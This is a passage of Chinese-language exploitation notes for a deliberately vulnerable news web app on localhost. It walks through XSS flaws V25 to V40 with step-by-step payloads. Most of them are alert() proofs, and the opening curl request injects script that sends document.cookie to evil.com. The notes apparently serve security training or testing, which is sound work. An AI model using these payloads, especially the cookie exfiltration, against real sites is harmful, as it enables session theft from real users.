  -d '{"title":"正常标题","content":"<h1>这是一篇正常的新闻</h1><p>新闻内容...</p><img src=x onerror=\"var img=document.createElement(\\\"img\\\");img.src=\\\"http://evil.com/steal?cookie=\\\"+document.cookie;document.body.appendChild(img);\">","author":"作者"}'
```

- 使用SVG标签:
```bash
curl -X POST http://localhost:3001/api/news \
  -H "Content-Type: application/json" \
  -d '{"title":"正常标题","content":"<svg onload=alert(\"XSS-V25\")>","author":"作者"}'
```

**注意事项**: 
- 这是最危险的存储型XSS漏洞之一，因为正文内容通常很长
- 攻击者可以创建看似正常的新闻文章，但包含恶意脚本
- 新闻正文是用户主要查看的内容，影响范围广
- Payload会被永久存储，直到手动删除
- 可以实现持久化的XSS攻击

---

### V26: DOM型XSS - 标签名称

**前置条件**: 
- 确保前端服务运行在 `http://localhost:3000`

**利用方式**: 
`tag`参数通过URL查询参数传递，前端使用原生DOM API的`innerHTML`属性直接设置到页面元素中。

**步骤**:
直接访问URL:
```
http://localhost:3000/tags?tag=<img src=x onerror=alert('XSS-V26')>
```

**预期结果**: 
- 页面加载后，标签显示区域会显示恶意HTML
- `alert('XSS-V26')`会被执行

---

### V27: 存储型XSS - 标签名称

**前置条件**: 
- 确保前后端服务正常运行
- 环境变量 `VULNERABILITIES_ENABLED=true`

**利用方式**: 
在标签管理页面创建标签时，将标签名称设置为XSS Payload。

**步骤**:
1. 访问 `http://localhost:3000/tags`
2. 在"标签名称"字段输入: `<img src=x onerror=alert('XSS-V27')>`
3. 填写其他字段并提交

**预期结果**: 
- 标签创建成功
- 刷新页面后，标签名称包含恶意HTML
- 当页面加载时，`alert('XSS-V27')`会被执行

---

### V28: DOM型XSS - 订阅分类(eval from hash)

**前置条件**: 
- 确保前端服务运行在 `http://localhost:3000`

**利用方式**: 
与V14相同，hash中的`category`参数被`eval()`函数执行。

**步骤**:
直接访问URL:
```
http://localhost:3000/subscriptions#category=');alert('XSS-V28');('
```

**预期结果**: 
- `eval()`函数会执行注入的代码
- `alert('XSS-V28')`会被执行

---

### V29: 存储型XSS - 订阅备注

**前置条件**: 
- 确保前后端服务正常运行
- 环境变量 `VULNERABILITIES_ENABLED=true`

**利用方式**: 
在订阅管理页面创建订阅时，在备注字段提交XSS Payload。

**步骤**:
1. 访问 `http://localhost:3000/subscriptions`
2. 选择用户ID和分类
3. 在"备注"字段输入: `<img src=x onerror=alert('XSS-V29')>`
4. 提交表单

**预期结果**: 
- 订阅创建成功
- 刷新页面后，订阅备注包含恶意HTML
- 当页面加载时，`alert('XSS-V29')`会被执行

---

### V30: DOM型XSS - 收藏用户

**前置条件**: 
- 确保前端服务运行在 `http://localhost:3000`

**利用方式**: 
`user`参数通过URL查询参数传递，前端使用`innerHTML`属性直接设置。

**步骤**:
直接访问URL:
```
http://localhost:3000/favorites?user=<img src=x onerror=alert('XSS-V30')>
```

**预期结果**: 
- 页面加载后，用户显示区域会显示恶意HTML
- `alert('XSS-V30')`会被执行

---

### V31: 存储型XSS - 收藏备注

**前置条件**: 
- 确保前后端服务正常运行
- 环境变量 `VULNERABILITIES_ENABLED=true`

**利用方式**: 
在收藏页面添加收藏时，在备注字段提交XSS Payload。

**步骤**:
1. 访问 `http://localhost:3000/favorites`
2. 选择用户ID和新闻
3. 在"备注"字段输入: `<img src=x onerror=alert('XSS-V31')>`
4. 提交表单

**预期结果**: 
- 收藏添加成功
- 刷新页面后，收藏备注包含恶意HTML
- 当页面加载时，`alert('XSS-V31')`会被执行

---

### V32: DOM型XSS - 分享平台(动态script)

**前置条件**: 
- 确保前端服务运行在 `http://localhost:3000`

**利用方式**: 
与V17相同，`platform`参数被用于动态创建的`<script>`标签。

**步骤**:
直接访问URL:
```
http://localhost:3000/share?platform=alert('XSS-V32')
```

**预期结果**: 
- 页面加载后，会动态创建`<script>`标签并执行
- `alert('XSS-V32')`会被执行

---

### V33: 存储型XSS - 分享平台和自定义消息

**前置条件**: 
- 确保前后端服务正常运行
- 环境变量 `VULNERABILITIES_ENABLED=true`

**利用方式**: 
在分享页面创建分享记录时，在平台或自定义消息字段提交XSS Payload。

**步骤**:
1. 访问 `http://localhost:3000/share`
2. 选择新闻和平台
3. 在"自定义消息"字段输入: `<img src=x onerror=alert('XSS-V33')>`
4. 提交表单

**预期结果**: 
- 分享记录创建成功
- 刷新页面后，自定义消息包含恶意HTML
- 当页面加载时，`alert('XSS-V33')`会被执行

---

### V34: DOM型XSS - RSS源名称(setTimeout)

**前置条件**: 
- 确保前端服务运行在 `http://localhost:3000`

**利用方式**: 
与V16相同，`feed`参数作为第一个参数传递给`setTimeout()`函数。

**步骤**:
直接访问URL:
```
http://localhost:3000/rss?feed=alert('XSS-V34')
```

**预期结果**: 
- 页面加载后，1秒后`alert('XSS-V34')`会被执行

---

### V35: 存储型XSS - RSS描述

**前置条件**: 
- 确保前后端服务正常运行
- 环境变量 `VULNERABILITIES_ENABLED=true`

**利用方式**: 
在RSS页面添加RSS源时，在描述字段提交XSS Payload。

**步骤**:
1. 访问 `http://localhost:3000/rss`
2. 填写RSS源名称和URL
3. 在"描述"字段输入: `<img src=x onerror=alert('XSS-V35')>`
4. 提交表单

**预期结果**: 
- RSS源添加成功
- 刷新页面后，RSS描述包含恶意HTML
- 当页面加载时，`alert('XSS-V35')`会被执行

---

### V36: DOM型XSS - 审核意见(document.write)

**前置条件**: 
- 确保前端服务运行在 `http://localhost:3000`

**利用方式**: 
`review`参数通过URL查询参数传递，用户点击"打印审核意见预览"按钮后使用`document.write()`写入页面。

**步骤**:
1. 访问URL: `http://localhost:3000/editor?review=<script>alert('XSS-V36')</script>`
2. 点击"**打印审核意见预览**"按钮

**预期结果**: 
- 点击按钮后，整个页面内容会被覆盖
- `alert('XSS-V36')`会被执行

---

### V37: 存储型XSS - 审核意见

**前置条件**: 
- 确保前后端服务正常运行
- 环境变量 `VULNERABILITIES_ENABLED=true`

**利用方式**: 
在编辑后台审核新闻时，在审核意见字段提交XSS Payload。

**步骤**:
1. 访问 `http://localhost:3000/editor`
2. 选择一篇待审核新闻
3. 在"审核意见"字段输入: `<img src=x onerror=alert('XSS-V37')>`
4. 提交审核

**预期结果**: 
- 审核完成
- 审核意见预览区域包含恶意HTML
- 当页面加载时，`alert('XSS-V37')`会被执行

---

### V38: 反射型XSS - 数据分析参数

**前置条件**: 
- 确保前后端服务正常运行
- 环境变量 `VULNERABILITIES_ENABLED=true`

**利用方式**: 
数据分析页面的`metric`、`period`、`filter`参数通过URL传递，会被反射到API响应中，然后在前端渲染。

**步骤**:
直接访问URL:
```
http://localhost:3000/analytics?metric=<img src=x onerror=alert('XSS-V38')>
```

**预期结果**: 
- 页面加载后，查询分析数据
- 分析结果中的指标字段包含恶意HTML
- `alert('XSS-V38')`会被执行

**其他Payload示例**:
- `http://localhost:3000/analytics?period=<script>alert('XSS-V38')</script>`
- `http://localhost:3000/analytics?filter=<svg onload=alert('XSS-V38')>`

---

### V39: DOM型XSS - 推荐理由(location.href)

**前置条件**: 
- 确保前端服务运行在 `http://localhost:3000`

**利用方式**: 
利用`location.href`的JavaScript伪协议。页面从URL hash中读取`reason`参数，并直接赋值给`window.location.href`。

**步骤**:
直接访问URL:
```
http://localhost:3000/recommendations#reason=javascript:alert('XSS-V39')
```

**预期结果**: 
- 页面加载后，等待0.5秒（`setTimeout`延迟）
- 页面会重定向到`javascript:alert('XSS-V39')`
- `alert('XSS-V39')`会被执行

---

### V40: 存储型XSS - 推荐理由

**前置条件**: 
- 确保前后端服务正常运行
- 环境变量 `VULNERABILITIES_ENABLED=true`

**利用方式**: 
在推荐系统页面创建推荐时，在推荐理由字段提交XSS Payload。

**步骤**:
1. 访问 `http://localhost:3000/recommendations`
2. 选择用户ID和新闻
3. 在"推荐理由"字段输入: `<img src=x onerror=alert('XSS-V40')>`
4. 提交表单

**预期结果**: 
- 推荐创建成功
- 刷新页面后，推荐理由包含恶意HTML
- 当页面加载时，`alert('XSS-V40')`会被执行
